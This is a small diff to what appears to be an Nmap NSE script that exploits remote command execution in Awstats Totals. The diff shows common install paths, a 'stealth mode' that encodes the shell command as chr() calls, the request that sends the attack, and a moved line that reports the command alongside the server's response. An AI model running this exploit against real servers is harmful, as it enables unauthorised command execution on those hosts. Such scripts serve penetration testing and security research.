@@ -11,6 +11,10 @@ Common paths for Awstats Total:
 * /awstats/index.php
 * /awstatstotals/index.php
 * /awstats/awstatstotals.php
+
+Reference:
+* 
+
 ]]
 
 ---
@@ -91,8 +95,7 @@ action = function(host, port)
     stdnse.print_debug(1, "%s:This does not look like Awstats Totals. Quitting.", SCRIPT_NAME)
     return
   end
-  output[#output+1] = "Command:"..cmd
-  --stealth mode is on, encode payload...
+ --stealth mode is on, encode payload...
   if stealth then
     local encoded_payload = ""
     cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
@@ -106,6 +109,7 @@ action = function(host, port)
   --set payload and send request
   local req = http.get(host, port, attack_uri)
   if req.status and req.status == 200 then
+    output[#output+1] = "Shell command:"..cmd
     output[#output+1] = req.body
 
     --if out set, save output to file
